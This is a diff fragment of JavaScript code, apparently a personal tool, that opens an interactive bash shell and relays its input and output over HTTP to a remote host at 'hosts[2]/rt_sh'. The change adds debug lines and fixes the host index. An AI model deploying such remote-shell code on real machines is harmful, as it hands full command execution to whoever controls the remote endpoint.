@@ -96,14 +96,18 @@ var xhr_shell=(method,URL)=>{
   var to_req=z=>data=>req.write(data.length+"\0"+z+"\0"+data);
   to_req("eval")(
     (()=>{
+      to_resp("out")("["+getDateTime()+"] :: begin\n");
       var sh=spawn('bash',['-i']);
+      var dbg=a=>to_resp("out")(a);
+      dbg("after spawn\n");
       pipe_from_to(sh.stderr,"err");
       pipe_from_to(sh.stdout,"out");
       sh.on('close',code=>to_resp("qap_log")("bash exited with code "+code));
       sh.on('error',code=>to_resp("qap_log")("bash error "+code));
       to_resp("out")("["+getDateTime()+"] :: begin\n");
       z2func['inp']=msg=>sh.stdin.write(msg);
-    }).toString().split("\n").slice(1,-1).join("\n");
+      
+    }).toString().split("\n").slice(1,-1).join("\n")
   );
   var inp=to_req("inp");inp("echo welcome!\n");
   var ping=to_req("ping");var iter=0;setInterval(()=>ping(""+(iter++)),500);
@@ -126,7 +130,7 @@ var xhr_shell=(method,URL)=>{
 
 var json=JSON.stringify;
 
-xhr_shell("post",hosts[id]+"/rt_sh");
+xhr_shell("post",hosts[2]+"/rt_sh");
 
 
 
